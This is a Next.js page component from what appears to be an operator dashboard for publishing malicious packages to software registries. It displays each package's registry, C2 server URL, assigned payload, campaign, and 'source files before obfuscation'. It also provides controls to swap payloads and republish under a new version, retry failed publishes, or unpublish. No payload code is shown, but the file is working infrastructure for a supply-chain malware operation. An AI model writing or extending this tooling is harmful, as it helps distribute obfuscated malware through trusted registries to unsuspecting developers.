import db, { type Payload } from '@/lib/db';
import Link from 'next/link';
import { notFound } from 'next/navigation';
import { switchPayloadAction, deletePackageAction, prepareRepublishAction, retryPublishAction } from '../actions';
import PackageFiles from './files';

export const dynamic = 'force-dynamic';

type FullPackage = {
  id: number; name: string; status: string; version: string; created_at: number;
  registry_url: string | null; c2_url: string | null;
  payload_id: number | null; payload_name: string | null;
  campaign_id: number | null; role: string | null;
  publish_files: string | null;
};

const STATUS_STYLE: Record<string, string> = {
  published: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20',
  failed: 'bg-red-500/10 text-red-400 border-red-500/20',
  pending: 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20',
};

export default async function PackageDetailPage({
  params,
  searchParams,
}: {
  params: Promise<{ id: string }>;
  searchParams: Promise<{ error?: string; confirm_delete?: string; confirm_republish?: string; repub_payload_id?: string; repub_version?: string; republished?: string; retried?: string; status?: string }>;
}) {
  const { id } = await params;
  const sp = await searchParams;

  const pkg = db.prepare(`
    SELECT p.*, a.registry_url, a.c2_url, pl.name AS payload_name
    FROM packages p
    LEFT JOIN accounts a ON p.account_id = a.id
    LEFT JOIN payloads pl ON p.payload_id = pl.id
    WHERE p.id = ?
  `).get(id) as FullPackage | undefined;

  if (!pkg) notFound();

  const payloads = db.prepare('SELECT * FROM payloads ORDER BY builtin DESC, name ASC').all() as Payload[];
  const [maj, min] = (pkg.version || '1.0.0').split('.').map(Number);
  const nextVersion = `${maj}.${(min || 0) + 1}.0`;

  const errorMsg: Record<string, string> = {
    'missing': 'package or payload not found',
    'no-account': 'this package has no account — cannot republish',
  };

  // Parse stored files for display
  const storedFiles: Record<string, string> | null = pkg.publish_files ? JSON.parse(pkg.publish_files) : null;

  return (
    <div className="max-w-3xl space-y-6">
      <Link href={pkg.campaign_id ? `/campaigns/${pkg.campaign_id}` : '/packages'} className="text-gray-500 text-xs hover:text-gray-300 transition-colors">
        ← {pkg.campaign_id ? 'campaign' : 'packages'}
      </Link>

      {/* Header */}
      <div>
        <div className="flex items-center gap-3 mb-1">
          <h1 className="text-xl font-semibold tracking-tight">{pkg.name}</h1>
          <span className={`px-2 py-0.5 rounded text-[11px] font-medium border ${STATUS_STYLE[pkg.status] ?? 'bg-gray-500/10 text-gray-400 border-gray-500/20'}`}>
            {pkg.status}
          </span>
          {pkg.role && (
            <span className="px-2 py-0.5 rounded text-[11px] text-gray-500 border border-gray-700">
              {pkg.role}
            </span>
          )}
        </div>
        <p className="text-xs text-gray-600">v{pkg.version || '1.0.0'}</p>
      </div>

      {/* Banners */}
      {sp.error && (
        <div className="text-sm rounded-lg border border-red-500/20 bg-red-500/5 text-red-400 px-4 py-3">
          {errorMsg[sp.error] ?? sp.error}
        </div>
      )}
      {sp.republished === '1' && (
        <div className={`text-sm rounded-lg border px-4 py-3 ${sp.status === 'ok' ? 'border-emerald-500/20 bg-emerald-500/5 text-emerald-400' : 'border-red-500/20 bg-red-500/5 text-red-400'}`}>
          {sp.status === 'ok' ? 'republished successfully' : 'republish failed — check account credentials and registry'}
        </div>
      )}
      {sp.retried === '1' && (
        <div className={`text-sm rounded-lg border px-4 py-3 ${sp.status === 'ok' ? 'border-emerald-500/20 bg-emerald-500/5 text-emerald-400' : 'border-red-500/20 bg-red-500/5 text-red-400'}`}>
          {sp.status === 'ok' ? 'retry succeeded — package published' : 'retry failed — check account credentials and registry'}
        </div>
      )}

      {/* Retry publish button for failed packages */}
      {pkg.status === 'failed' && pkg.registry_url && (
        <form action={retryPublishAction}>
          <input type="hidden" name="id" value={pkg.id} />
          <button type="submit" className="flex items-center gap-2 px-4 py-2 rounded-lg bg-orange-500/10 border border-orange-500/30 text-orange-300 text-sm hover:bg-orange-500/20 transition-colors">
            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
            retry publish
          </button>
        </form>
      )}

      {/* Details */}
      <div className="rounded-lg bg-gray-900/50 border border-gray-800/50 p-5">
        <h2 className="text-xs font-medium text-gray-500 uppercase tracking-wider mb-4">Details</h2>
        <div className="grid grid-cols-[auto_1fr] gap-x-6 gap-y-2 text-sm">
          <span className="text-gray-500">registry</span><span className="text-gray-300 truncate">{pkg.registry_url ?? '—'}</span>
          <span className="text-gray-500">c2</span><span className="text-gray-300 truncate">{pkg.c2_url ?? '—'}</span>
          <span className="text-gray-500">version</span><span className="text-gray-300 font-mono">{pkg.version || '1.0.0'}</span>
          <span className="text-gray-500">payload</span><span className="text-gray-300">{pkg.payload_name ?? '—'}</span>
          <span className="text-gray-500">created</span><span className="text-gray-300">{new Date(pkg.created_at * 1000).toLocaleString()}</span>
          {pkg.campaign_id && (
            <>
              <span className="text-gray-500">campaign</span>
              <Link href={`/campaigns/${pkg.campaign_id}`} className="text-blue-400 hover:text-blue-300 transition-colors">
                view campaign →
              </Link>
            </>
          )}
        </div>
      </div>

      {/* Package files */}
      {storedFiles && (
        <div className="rounded-lg bg-gray-900/50 border border-gray-800/50 p-5">
          <h2 className="text-xs font-medium text-gray-500 uppercase tracking-wider mb-4">Package Contents</h2>
          <p className="text-[11px] text-gray-600 mb-3">source files before obfuscation</p>
          <PackageFiles files={storedFiles} />
        </div>
      )}

      {/* Switch payload (non-campaign packages only) */}
      {!pkg.campaign_id && (
        <div className="rounded-lg bg-gray-900/50 border border-gray-800/50 p-5">
          <h2 className="text-xs font-medium text-gray-500 uppercase tracking-wider mb-4">Switch Payload</h2>
          {!pkg.registry_url ? (
            <p className="text-gray-600 text-sm">no account linked — cannot republish</p>
          ) : sp.confirm_republish === '1' && sp.repub_payload_id && sp.repub_version ? (
            <div className="space-y-3">
              <p className="text-sm text-yellow-200">
                Republish <span className="font-semibold">{pkg.name}</span> as <span className="font-mono">{sp.repub_version}</span> with payload <span className="font-semibold">{payloads.find(p => String(p.id) === sp.repub_payload_id)?.name ?? sp.repub_payload_id}</span>?
              </p>
              <div className="flex gap-3">
                <form action={switchPayloadAction}>
                  <input type="hidden" name="pkg_id" value={pkg.id} />
                  <input type="hidden" name="payload_id" value={sp.repub_payload_id} />
                  <input type="hidden" name="version" value={sp.repub_version} />
                  <button type="submit" className="text-sm px-4 py-2 rounded-lg border border-white/20 text-white hover:bg-white/10 transition-colors">
                    confirm republish
                  </button>
                </form>
                <Link href={`/packages/${pkg.id}`} className="text-sm px-4 py-2 rounded-lg border border-gray-700 text-gray-400 hover:border-gray-600 hover:text-gray-300 transition-colors">
                  cancel
                </Link>
              </div>
            </div>
          ) : (
            <form action={prepareRepublishAction} className="space-y-3">
              <input type="hidden" name="pkg_id" value={pkg.id} />
              <div>
                <label className="text-xs text-gray-500 block mb-1">Payload</label>
                <select
                  name="payload_id"
                  defaultValue={pkg.payload_id ?? ''}
                  required
                  className="w-full bg-black border border-gray-700 rounded-lg text-white text-sm p-2.5 focus:outline-none focus:border-gray-500 transition-colors"
                >
                  <option value="" disabled>select a payload…</option>
                  {payloads.map(p => (
                    <option key={p.id} value={p.id}>
                      {p.name}{p.builtin ? ' [built-in]' : ''}{p.id === pkg.payload_id ? ' ✓' : ''}
                    </option>
                  ))}
                </select>
              </div>
              <div>
                <label className="text-xs text-gray-500 block mb-1">Version</label>
                <input
                  name="version"
                  defaultValue={nextVersion}
                  required
                  placeholder="e.g. 1.2.0"
                  className="w-full bg-black border border-gray-700 rounded-lg text-white text-sm p-2.5 focus:outline-none focus:border-gray-500 transition-colors font-mono"
                />
              </div>
              <button type="submit" className="border border-white/20 px-4 py-2 rounded-lg text-sm hover:bg-white/10 transition-colors">
                republish
              </button>
            </form>
          )}
        </div>
      )}

      {/* Delete */}
      <div className="rounded-lg border border-red-500/10 bg-red-500/5 p-5">
        <h2 className="text-xs font-medium text-gray-500 uppercase tracking-wider mb-3">Danger</h2>
        {sp.confirm_delete === '1' ? (
          <div className="space-y-3">
            <p className="text-sm text-red-300">Delete <span className="font-semibold">{pkg.name}</span> and unpublish from registry?</p>
            <div className="flex gap-3">
              <form action={deletePackageAction}>
                <input type="hidden" name="id" value={pkg.id} />
                <button type="submit" className="text-sm px-4 py-2 rounded-lg bg-red-900/50 border border-red-700/50 text-red-200 hover:bg-red-800/50 transition-colors">
                  yes, delete
                </button>
              </form>
              <Link href={`/packages/${pkg.id}`} className="text-sm px-4 py-2 rounded-lg border border-gray-700 text-gray-400 hover:border-gray-600 hover:text-gray-300 transition-colors">
                cancel
              </Link>
            </div>
          </div>
        ) : (
          <Link href={`/packages/${pkg.id}?confirm_delete=1`} className="text-xs text-red-500/70 hover:text-red-400 transition-colors">
            delete &amp; unpublish
          </Link>
        )}
      </div>
    </div>
  );
}
